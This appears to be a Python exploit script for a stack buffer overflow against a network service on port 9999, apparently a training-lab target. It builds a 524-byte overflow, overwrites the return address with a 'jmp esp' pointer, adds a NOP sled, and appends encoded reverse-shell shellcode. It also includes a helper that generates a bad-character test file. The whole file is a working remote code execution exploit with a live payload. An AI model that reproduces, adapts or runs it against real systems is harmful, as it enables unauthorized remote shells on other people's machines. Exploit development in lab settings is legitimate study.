import socket
import struct

IP = "192.168.56.134"
PORT = 9999
RECVSIZE = 1024
OFFSET = 524

reverseShellCode =  b""
reverseShellCode += b"\xda\xc0\xba\x28\xa8\xcc\xcb\xd9\x74\x24"
reverseShellCode += b"\xf4\x5e\x2b\xc9\xb1\x52\x31\x56\x17\x03"
reverseShellCode += b"\x56\x17\x83\xc6\x54\x2e\x3e\xea\x4d\x2d"
reverseShellCode += b"\xc1\x12\x8e\x52\x4b\xf7\xbf\x52\x2f\x7c"
reverseShellCode += b"\xef\x62\x3b\xd0\x1c\x08\x69\xc0\x97\x7c"
reverseShellCode += b"\xa6\xe7\x10\xca\x90\xc6\xa1\x67\xe0\x49"
reverseShellCode += b"\x22\x7a\x35\xa9\x1b\xb5\x48\xa8\x5c\xa8"
reverseShellCode += b"\xa1\xf8\x35\xa6\x14\xec\x32\xf2\xa4\x87"
reverseShellCode += b"\x09\x12\xad\x74\xd9\x15\x9c\x2b\x51\x4c"
reverseShellCode += b"\x3e\xca\xb6\xe4\x77\xd4\xdb\xc1\xce\x6f"
reverseShellCode += b"\x2f\xbd\xd0\xb9\x61\x3e\x7e\x84\x4d\xcd"
reverseShellCode += b"\x7e\xc1\x6a\x2e\xf5\x3b\x89\xd3\x0e\xf8"
reverseShellCode += b"\xf3\x0f\x9a\x1a\x53\xdb\x3c\xc6\x65\x08"
reverseShellCode += b"\xda\x8d\x6a\xe5\xa8\xc9\x6e\xf8\x7d\x62"
reverseShellCode += b"\x8a\x71\x80\xa4\x1a\xc1\xa7\x60\x46\x91"
reverseShellCode += b"\xc6\x31\x22\x74\xf6\x21\x8d\x29\x52\x2a"
reverseShellCode += b"\x20\x3d\xef\x71\x2d\xf2\xc2\x89\xad\x9c"
reverseShellCode += b"\x55\xfa\x9f\x03\xce\x94\x93\xcc\xc8\x63"
reverseShellCode += b"\xd3\xe6\xad\xfb\x2a\x09\xce\xd2\xe8\x5d"
reverseShellCode += b"\x9e\x4c\xd8\xdd\x75\x8c\xe5\x0b\xd9\xdc"
reverseShellCode += b"\x49\xe4\x9a\x8c\x29\x54\x73\xc6\xa5\x8b"
reverseShellCode += b"\x63\xe9\x6f\xa4\x0e\x10\xf8\x0b\x66\x22"
reverseShellCode += b"\x92\xe3\x75\x52\x73\xa8\xf0\xb4\x19\x40"
reverseShellCode += b"\x55\x6f\xb6\xf9\xfc\xfb\x27\x05\x2b\x86"
reverseShellCode += b"\x68\x8d\xd8\x77\x26\x66\x94\x6b\xdf\x86"
reverseShellCode += b"\xe3\xd1\x76\x98\xd9\x7d\x14\x0b\x86\x7d"
reverseShellCode += b"\x53\x30\x11\x2a\x34\x86\x68\xbe\xa8\xb1"
reverseShellCode += b"\xc2\xdc\x30\x27\x2c\x64\xef\x94\xb3\x65"
reverseShellCode += b"\x62\xa0\x97\x75\xba\x29\x9c\x21\x12\x7c"
reverseShellCode += b"\x4a\x9f\xd4\xd6\x3c\x49\x8f\x85\x96\x1d"
reverseShellCode += b"\x56\xe6\x28\x5b\x57\x23\xdf\x83\xe6\x9a"
reverseShellCode += b"\xa6\xbc\xc7\x4a\x2f\xc5\x35\xeb\xd0\x1c"
reverseShellCode += b"\xfe\x0b\x33\xb4\x0b\xa4\xea\x5d\xb6\xa9"
reverseShellCode += b"\x0c\x88\xf5\xd7\x8e\x38\x86\x23\x8e\x49"
reverseShellCode += b"\x83\x68\x08\xa2\xf9\xe1\xfd\xc4\xae\x02"
reverseShellCode += b"\xd4"

def conv(address):
    return(struct.pack("<I", address))

def generate_badchar():
    badchar_test = b''
    badchars = [0x00, 0x0A, 0x0D]

    for i in range(0x00, 0xFF+1):
        if i not in badchars:
            badchar_test += struct.pack("B", i)

    with open("badchar_test.bin", "wb") as f:
        f.write(badchar_test)

    return(badchar_test)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    sock.connect((IP, PORT))

    data = sock.recv(RECVSIZE).decode()
    print(data)

    buf  = b"A" * OFFSET 
    buf += conv(0x311712f3) # jmp esp
    buf += b"\x90" * 32
    buf += reverseShellCode
    buf += b"\r\n"
    
    sock.sendall(buf)

    data = sock.recv(RECVSIZE).decode()
    print(data)

    sock.close()

except Exception as err:
    print(f"Error: {err}")